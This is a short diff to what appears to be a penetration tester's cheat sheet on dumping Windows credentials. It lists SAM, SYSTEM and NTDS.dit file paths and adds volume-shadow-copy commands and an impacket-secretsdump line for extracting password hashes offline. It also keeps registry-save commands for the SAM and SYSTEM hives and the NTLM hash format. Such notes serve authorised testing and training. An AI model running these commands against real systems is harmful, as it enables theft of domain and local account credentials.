@@ -7,8 +7,13 @@ Windows:
 %/SystemRoot%/system32/config/system
 
 Windows Server:
-%/SystemRoot%/ntds/ntds.dit
+%/SystemRoot%/NTDS/ntds.dit
 %/SystemRoot%/system32/config/system
+
+vssadmin list volumes
+vssadmin create shadow /for=C:
+
+impacket-secretsdump -ntds [FILE] -system [FILE] LOCAL
 
 Windows XP:
 C:/Windows/repair
@@ -16,7 +21,6 @@ C:/Windows/repair
 reg save hklm\sam new_sam
 reg save hklm\system new_system
 
-vssadmin
 
 [USER]:[ID]:[LM]:[NTLM]
 LM:aad3b435b51404eeaad3b435b51404ee [VAZIO]
